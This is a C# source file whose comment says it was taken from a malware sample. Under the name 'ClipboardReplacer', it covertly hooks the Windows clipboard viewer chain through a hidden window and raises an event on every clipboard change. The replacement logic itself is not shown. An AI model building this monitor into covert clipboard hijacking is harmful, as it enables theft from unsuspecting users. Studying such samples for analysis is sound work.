/*
 * This was taken from a random malware found in my todo reverse folder
 * Contact me on twitter at @DavidTheTechMTI for the sample
*/

using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace ClipboardReplacer
{
    public enum Clipform : byte
    {
        Text,
        UnicodeText,
        Dib,
        Bitmap,
        EnhancedMetafile,
        MetafilePict,
        SymbolicLink,
        Dif,
        Tiff,
        OemText,
        Palette,
        PenData,
        Riff,
        WaveAudio,
        FileDrop,
        Locale,
        Html,
        Rtf,
        CommaSeparatedValue,
        StringFormat,
        Serializable
    }

    public static class ClipMon
    {
        public static event OnClipboardChangeEventHandler OnClipboardChange;

        public delegate void OnClipboardChangeEventHandler(Clipform format, object data);

        public static void Start()
        {
            Clipwatch.Start();
            Clipwatch.OnClipboardChange += delegate(Clipform format, object data)
            {
                OnClipboardChange(format, data);
            };
        }

        public static void Stop()
        {
            OnClipboardChange = null;
            Clipwatch.Stop();
        }

        private class Clipwatch : Form
        {
            public static event Clipwatch.OnClipboardChangeEventHandler OnClipboardChange;
            private const int WM_DRAWCLIPBOARD = 776;
            private const int WM_CHANGECBCHAIN = 781;
            private static Clipwatch mInstance;
            private static IntPtr nextClipboardViewer;
            private static readonly string[] formats = Enum.GetNames(typeof(Clipform));
            public delegate void OnClipboardChangeEventHandler(Clipform format, object data);

            [DllImport("User32.dll", CharSet = CharSet.Auto)]
            private static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);
            [DllImport("User32.dll", CharSet = CharSet.Auto)]
            private static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);
            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            private static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);

            public static void Start()
            {
                if (Clipwatch.mInstance != null)
                {
                    return;
                }
                Thread thread = new Thread(delegate(object x)
                {
                    Application.Run(new Clipwatch());
                });
                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
            }

            public static void Stop()
            {
                Clipwatch.mInstance.Invoke(new MethodInvoker(delegate()
                {
                    Clipwatch.ChangeClipboardChain(Clipwatch.mInstance.Handle, Clipwatch.nextClipboardViewer);
                }));
                Clipwatch.mInstance.Invoke(new MethodInvoker(Clipwatch.mInstance.Close));
                Clipwatch.mInstance.Dispose();
                Clipwatch.mInstance = null;
            }

            protected override void SetVisibleCore(bool value)
            {
                this.CreateHandle();
                Clipwatch.mInstance = this;
                Clipwatch.nextClipboardViewer = Clipwatch.SetClipboardViewer(Clipwatch.mInstance.Handle);
                base.SetVisibleCore(false);
            }

            protected override void WndProc(ref Message m)
            {
                int msg = m.Msg;
                if (msg == 776)
                {
                    this.ClipChang();
                    Clipwatch.SendMessage(Clipwatch.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                    return;
                }
                if (msg != 781)
                {
                    base.WndProc(ref m);
                    return;
                }
                if (m.WParam == Clipwatch.nextClipboardViewer)
                {
                    Clipwatch.nextClipboardViewer = m.LParam;
                    return;
                }
                Clipwatch.SendMessage(Clipwatch.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
            }

            private void ClipChang()
            {
                IDataObject dataObject = Clipboard.GetDataObject();
                Clipform ? clipform = null;
                foreach (string text in Clipwatch.formats)
                {
                    if (dataObject.GetDataPresent(text))
                    {
                        clipform = new Clipform?((Clipform)Enum.Parse(typeof(Clipform), text));
                        break;
                    }
                }
                object data = dataObject.GetData(clipform.ToString());
                if (data == null || clipform == null)
                {
                    return;
                }
                Clipwatch.OnClipboardChange(clipform.Value, data);
            }
        }
    }
}
